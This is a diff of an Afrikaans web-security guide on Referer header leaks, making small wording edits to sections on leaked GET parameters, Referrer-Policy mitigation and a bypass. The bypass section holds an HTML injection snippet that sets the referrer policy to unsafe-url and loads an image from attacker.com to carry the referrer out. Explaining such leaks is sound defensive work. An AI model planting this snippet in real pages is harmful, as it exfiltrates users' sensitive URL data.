@@ -2,11 +2,11 @@
 
 # Verwysingskoppe en beleid
 
-Verwysing is die kop wat deur blaaiers gebruik word om aan te dui watter die vorige bladsy was.
+Verwysing is die kop wat deur blaaiers gebruik word om aan te dui watter die vorige bladsy was wat besoek is.
 
 ## Sensitiewe inligting gelekt
 
-As daar op 'n stadium binne 'n webblad enige sensitiewe inligting op 'n GET-versoekparameters geleë is, as die bladsy skakels na eksterne bronne bevat of 'n aanvaller in staat is om die gebruiker te laat besoek of voor te stel (sosiale ingenieurswese) 'n URL wat deur die aanvaller beheer word. Dit kan in staat wees om die sensitiewe inligting binne die laaste GET-versoek te eksfiltreer.
+As daar op 'n stadium binne 'n webblad enige sensitiewe inligting op 'n GET-versoekparameters geleë is, as die bladsy skakels na eksterne bronne bevat of 'n aanvaller in staat is om die gebruiker te laat besoek 'n URL wat deur die aanvaller beheer word (sosiale ingenieurswese). Dit kan in staat wees om die sensitiewe inligting binne die laaste GET-versoek te eksfiltreer.
 
 ## Versagting
 
@@ -24,7 +24,7 @@ Referrer-Policy: unsafe-url
 ## Teen-Mitigering
 
 Jy kan hierdie reël oorskry deur 'n HTML meta-tag te gebruik (die aanvaller moet 'n HTML-inspuiting benut):
-```markup
+```html
 <meta name="referrer" content="unsafe-url">
 <img src="https://attacker.com">
 ```
